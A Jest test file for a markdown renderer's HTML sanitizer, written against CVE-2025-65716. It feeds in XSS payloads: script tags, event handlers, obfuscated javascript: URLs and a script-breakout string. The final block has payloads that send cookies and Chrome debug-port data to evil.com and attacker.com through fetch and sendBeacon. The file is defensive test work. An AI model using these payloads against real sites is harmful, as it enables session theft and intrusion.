import * as cheerio from 'cheerio';
import { sanitizeRenderedHTML } from '../src/markdown-engine/sanitize';
import {
  LONG_MUTATION,
  MUTATIONS,
  readAgain,
} from './fixtures/mutating-markup';

describe('sanitizeRenderedHTML (CVE-2025-65716)', () => {
  function sanitize(html: string): string {
    const $ = cheerio.load(html);
    sanitizeRenderedHTML($);
    return ($('body').html() ?? '').trim();
  }

  /** The notes of the first element of a page that has any. */
  function notesOf(html: string): string | undefined {
    return cheerio.load(html)('[data-notes]').first().attr('data-notes');
  }

  describe('script tag removal', () => {
    it('removes inline script tags', () => {
      const result = sanitize('<p>Hello</p><script>alert("xss")</script>');
      expect(result).toBe('<p>Hello</p>');
      expect(result).not.toContain('<script');
    });

    it('removes script tags with src', () => {
      const result = sanitize(
        '<div><script src="http://evil.com/payload.js"></script></div>',
      );
      expect(result).not.toContain('<script');
    });

    it('removes script tags inside SVG', () => {
      const result = sanitize('<svg><script>alert("xss")</script></svg>');
      expect(result).not.toContain('<script');
    });
  });

  describe('event handler attribute removal', () => {
    it('strips onload from iframe', () => {
      const result = sanitize(
        '<iframe src="http://example.com" onload="alert(1)"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('iframe');
    });

    it('strips onerror from img', () => {
      const result = sanitize('<img src="x" onerror="alert(1)">');
      expect(result).not.toContain('onerror');
      expect(result).toContain('<img');
    });

    it('strips onclick from any element', () => {
      const result = sanitize('<div onclick="stealData()">Click me</div>');
      expect(result).not.toContain('onclick');
      expect(result).toContain('Click me');
    });

    it('strips onmouseover', () => {
      const result = sanitize('<a href="#" onmouseover="evil()">Link</a>');
      expect(result).not.toContain('onmouseover');
    });

    it('strips onfocus', () => {
      const result = sanitize('<input onfocus="evil()" autofocus>');
      expect(result).not.toContain('onfocus');
    });

    it('strips SVG onload', () => {
      const result = sanitize(
        '<svg onload="alert(1)"><circle r="10"></circle></svg>',
      );
      expect(result).not.toContain('onload');
    });
  });

  describe('dangerous URL scheme removal', () => {
    it('strips javascript: from href', () => {
      const result = sanitize('<a href="javascript:alert(1)">Click</a>');
      expect(result).not.toContain('javascript:');
      expect(result).toContain('Click');
    });

    it('strips javascript: from src', () => {
      const result = sanitize('<iframe src="javascript:alert(1)"></iframe>');
      expect(result).not.toContain('javascript:');
    });

    it('strips vbscript: URLs', () => {
      const result = sanitize('<a href="vbscript:MsgBox(1)">Click</a>');
      expect(result).not.toContain('vbscript:');
    });

    it('strips data:text/html URLs', () => {
      const result = sanitize(
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      );
      expect(result).not.toContain('data:text/html');
    });

    it('handles case-insensitive javascript: URLs', () => {
      const result = sanitize('<a href="JaVaScRiPt:alert(1)">Click</a>');
      expect(result).not.toContain('href');
    });

    it('handles whitespace-padded javascript: URLs', () => {
      const result = sanitize('<a href="  javascript:alert(1)">Click</a>');
      expect(result).not.toContain('javascript');
    });

    it('strips javascript: from a background iframe of reveal.js', () => {
      const result = sanitize(
        '<section data-background-iframe="javascript:alert(1)"><p>Slide</p></section>',
      );
      expect(result).not.toContain('javascript:');
      expect(result).toContain('<section><p>Slide</p></section>');
    });

    // A browser leaves a tab, a line feed or a carriage return out of a URL
    // wherever it is, and a control character or a space at either end of it:
    // each of these addresses runs its script as `javascript:` would.
    it.each([
      ['a tab in its scheme', 'java&#9;script:alert(1)'],
      ['a line feed in its scheme', 'jav&#10;ascript:alert(1)'],
      ['a carriage return in its scheme', 'jav&#13;ascript:alert(1)'],
      ['a control character before its scheme', '&#1;javascript:alert(1)'],
      ['a control character before vbscript', '&#11;vbscript:MsgBox(1)'],
      ['a tab in the type of a data URL', 'data:text&#9;/html,<b>x</b>'],
    ])('strips an address with %s', (_, address) => {
      const result = sanitize(`<a href="${address}">Click</a>`);
      expect(result).toBe('<a>Click</a>');
    });

    it.each([
      ['/my files/a b.pdf'],
      ['https://example.com/search?a=1&b=2'],
      ['mailto:a@example.com?subject=hi there'],
      ['#java script'],
      ['javascript-tips.html'],
      ['data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>'],
    ])('keeps the address %s', (address) => {
      const result = sanitize(`<a href="${address}">Click</a>`);
      expect(result).toContain('href=');
    });

    it('preserves safe URLs', () => {
      const result = sanitize('<a href="https://example.com">Safe link</a>');
      expect(result).toContain('href="https://example.com"');
    });

    it('preserves data: image URLs', () => {
      const result = sanitize('<img src="data:image/png;base64,abc123">');
      expect(result).toContain('data:image/png');
    });
  });

  describe('a plaintext element', () => {
    it('is kept as its text, in a pre element', () => {
      // A `plaintext` element has no end tag: all that follows it is its text.
      const result = sanitize(
        '<p>before</p><plaintext>after <b>as text</b><p>still text</p>',
      );
      expect(result).toBe(
        '<p>before</p><pre>after &lt;b&gt;as text&lt;/b&gt;&lt;p&gt;still text&lt;/p&gt;</pre>',
      );
    });

    it('in MathML is an ordinary element, and is left as it is', () => {
      const result = sanitize(
        '<math><mglyph><plaintext>a</plaintext></mglyph></math>',
      );
      expect(result).toContain('<plaintext>a</plaintext>');
      expect(result).not.toContain('<pre>');
    });
  });

  describe('HTML held in an attribute', () => {
    it('sanitizes the speaker notes of a slide as the HTML they are', () => {
      // reveal.js writes the notes of a slide into the window of its speaker
      // view as HTML.
      const result = sanitize(
        '<section data-notes="&lt;input autofocus onfocus=&quot;alert(1)&quot;&gt;&lt;b&gt;Note&lt;/b&gt;&lt;img src=x onerror=alert(2)&gt;"></section>',
      );
      const notes = cheerio.load(result)('section').attr('data-notes');

      expect(notes).toBe('<input autofocus=""><b>Note</b><img src="x">');
    });

    it('leaves the notes that the notes of a slide hold as the attribute they are there', () => {
      // Nothing writes an attribute of an element inside the notes into the
      // page again, so there it is only an attribute — and notes within notes
      // are not read again and again.
      const result = sanitize(
        '<section data-notes="&lt;section data-notes=&quot;&amp;lt;input onfocus=alert(1)&amp;gt;&quot;></section>"></section>',
      );

      // What reveal.js writes is an element whose attribute holds the text.
      expect(notesOf(result)).toBe(
        '<section data-notes="<input onfocus=alert(1)>"></section>',
      );
      expect(readAgain(notesOf(result) ?? '')).toEqual([]);
    });

    /** The notes on the first element of `element`, as the engine writes it. */
    function withNotes(element: string, notes: string): string {
      const $ = cheerio.load(element, null, false);
      $.root().children().first().attr('data-notes', notes);
      return $.root().html() ?? '';
    }

    // reveal.js takes the notes of a slide and of the fragment that is
    // current, and which elements those are it decides by classes — one of
    // which a note can write itself. So the notes are notes wherever they are.
    describe.each([
      ['a slide', '<section><p>Slide</p></section>'],
      ['a fragment', '<div class="fragment">A point</div>'],
      [
        'an element with other classes too',
        '<p class="step fragment fade-in">A point</p>',
      ],
      [
        'the fragment that is current, the class written by the note',
        '<p class="current-fragment">A point</p>',
      ],
      ['any other element', '<p>A point</p>'],
    ])('the notes of %s', (_, element) => {
      it('are read as the HTML they are', () => {
        const result = sanitize(
          withNotes(element, '<input autofocus onfocus=alert(1)><b>Speak</b>'),
        );

        expect(notesOf(result)).toBe('<input autofocus=""><b>Speak</b>');
      });

      it.each([...MUTATIONS, LONG_MUTATION])(
        'have no event handler, whatever reading a page gives them: %s',
        (markup) => {
          const result = sanitize(withNotes(element, markup));

          // reveal.js reads the notes as the content of an element.
          expect(readAgain(notesOf(result) ?? '')).toEqual([]);
        },
      );
    });

    it('leaves the notes of a slide that are no threat as they are', () => {
      const result = sanitize(
        '<section data-notes="Say it &lt;b&gt;loudly&lt;/b&gt;."><p>Slide</p></section>',
      );
      const section = cheerio.load(result)('section');

      expect(section.attr('data-notes')).toBe('Say it <b>loudly</b>.');
      expect(section.html()).toBe('<p>Slide</p>');
    });
  });

  describe('dangerous tag removal', () => {
    it('removes object tags', () => {
      const result = sanitize(
        '<object data="http://evil.com/flash.swf"></object>',
      );
      expect(result).not.toContain('<object');
    });

    it('removes embed tags', () => {
      const result = sanitize('<embed src="http://evil.com/flash.swf">');
      expect(result).not.toContain('<embed');
    });

    it('removes applet tags', () => {
      const result = sanitize('<applet code="Evil.class"></applet>');
      expect(result).not.toContain('<applet');
    });

    it('preserves WaveDrom data scripts', () => {
      const result = sanitize(
        '<div class="wavedrom"><script type="WaveDrom">{"signal":[]}</script></div>',
      );
      expect(result).toContain('<script type="WaveDrom">');
      expect(result).toContain('{"signal":[]}');
    });

    it('normalizes JSON5 WaveDrom data scripts to strict JSON', () => {
      const result = sanitize(
        `<div class="wavedrom"><script type="WaveDrom">{ signal: [ { name: 'clk', wave: 'p..' }, ], }</script></div>`,
      );
      expect(result).toContain('<script type="WaveDrom">');
      // unquoted keys / single quotes / trailing commas become strict JSON
      expect(result).toContain('{"signal":[{"name":"clk","wave":"p.."}]}');
      expect(result).not.toContain("'clk'");
    });

    it('drops WaveDrom data scripts that contain executable code', () => {
      const result = sanitize(
        `<div class="wavedrom"><script type="WaveDrom">(()=>{return globalThis.process})()</script></div>`,
      );
      expect(result).not.toContain('<script');
      expect(result).not.toContain('globalThis');
    });

    it('drops WaveDrom data scripts with a function-call payload', () => {
      const result = sanitize(
        `<div class="wavedrom"><script type="WaveDrom">alert(1)</script></div>`,
      );
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert(1)');
    });

    it('escapes a </script> value so it cannot break out after re-serialization', () => {
      // The raw input uses a JSON escape (<\/script>) so the HTML parser does
      // NOT treat it as a closing tag; JSON5 decodes it to a literal
      // "</script>" string value, which JSON.stringify would otherwise emit
      // raw and break out of the <script> container.
      const result = sanitize(
        '<div class="wavedrom"><script type="WaveDrom">{"name":"<\\/script><img src=x onerror=alert(1)>"}</script></div>',
      );
      expect(result).toContain('<script type="WaveDrom">');
      expect(result).not.toContain('</script><img');
      expect(result).toContain('\\u003c/script>');
    });

    it('preserves TikZ scripts', () => {
      const tikzCode =
        '\\begin{tikzpicture}\\draw (0,0) -- (1,1);\\end{tikzpicture}';
      const result = sanitize(
        `<div><script type="text/tikz">${tikzCode}</script></div>`,
      );
      expect(result).toContain('<script type="text/tikz">');
      expect(result).toContain(tikzCode);
    });

    it('removes script tags without type', () => {
      const result = sanitize('<script>alert("xss")</script>');
      expect(result).not.toContain('<script');
    });

    it('removes script tags with type="text/javascript"', () => {
      const result = sanitize(
        '<script type="text/javascript">alert("xss")</script>',
      );
      expect(result).not.toContain('<script');
    });
  });

  describe('iframe sandboxing', () => {
    it('adds sandbox attribute to iframes', () => {
      const result = sanitize('<iframe src="https://example.com"></iframe>');
      expect(result).toContain('sandbox=""');
    });

    it('overrides existing sandbox attribute', () => {
      const result = sanitize(
        '<iframe src="https://example.com" sandbox="allow-scripts allow-same-origin"></iframe>',
      );
      expect(result).toContain('sandbox=""');
      expect(result).not.toContain('allow-scripts');
    });

    it('removes srcdoc from iframes', () => {
      const result = sanitize(
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      );
      expect(result).not.toContain('srcdoc');
    });
  });

  describe('preserves safe HTML', () => {
    it('preserves standard markdown elements', () => {
      const html = `
        <h1>Title</h1>
        <p>Paragraph with <strong>bold</strong> and <em>italic</em>.</p>
        <ul><li>Item 1</li><li>Item 2</li></ul>
        <table><tr><th>Header</th></tr><tr><td>Cell</td></tr></table>
        <pre><code class="language-js">const x = 1;</code></pre>
        <blockquote>Quote</blockquote>
      `;
      const result = sanitize(html);
      expect(result).toContain('<h1>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<table>');
      expect(result).toContain('<pre>');
      expect(result).toContain('<blockquote>');
    });

    it('preserves data attributes used by crossnote', () => {
      const result = sanitize('<p data-source-line="5">Content</p>');
      expect(result).toContain('data-source-line="5"');
    });

    it('preserves class attributes', () => {
      const result = sanitize('<div class="mermaid">graph TD; A-->B;</div>');
      expect(result).toContain('class="mermaid"');
    });

    it('preserves images with safe src', () => {
      const result = sanitize(
        '<img src="https://example.com/image.png" alt="test">',
      );
      expect(result).toContain('src="https://example.com/image.png"');
    });
  });

  describe('CVE-2025-65716 specific attack vectors', () => {
    it('neutralizes iframe+onload attack', () => {
      const result = sanitize(
        '<iframe src="http://localhost:8080" onload="fetch(\'http://evil.com/steal?data=\'+document.cookie)"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('sandbox=""');
    });

    it('neutralizes port scanning via iframe', () => {
      const result = sanitize(
        '<iframe src="http://localhost:3000" onload="scanPorts()"></iframe>',
      );
      expect(result).not.toContain('onload');
      expect(result).toContain('sandbox=""');
    });

    it('handles complex attack payload', () => {
      const malicious = `
        <p>Innocent looking document</p>
        <iframe src="http://localhost:9222" onload="
          var ws = new WebSocket('ws://localhost:9222');
          ws.onmessage = function(e) {
            fetch('http://attacker.com/exfil', {method:'POST', body: e.data});
          };
        "></iframe>
        <script>
          navigator.sendBeacon('http://attacker.com/ping', JSON.stringify({
            hostname: location.hostname,
            cookies: document.cookie
          }));
        </script>
      `;
      const result = sanitize(malicious);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onload');
      expect(result).not.toContain('WebSocket');
      expect(result).not.toContain('sendBeacon');
      expect(result).toContain('Innocent looking document');
      expect(result).toContain('sandbox=""');
    });
  });
});
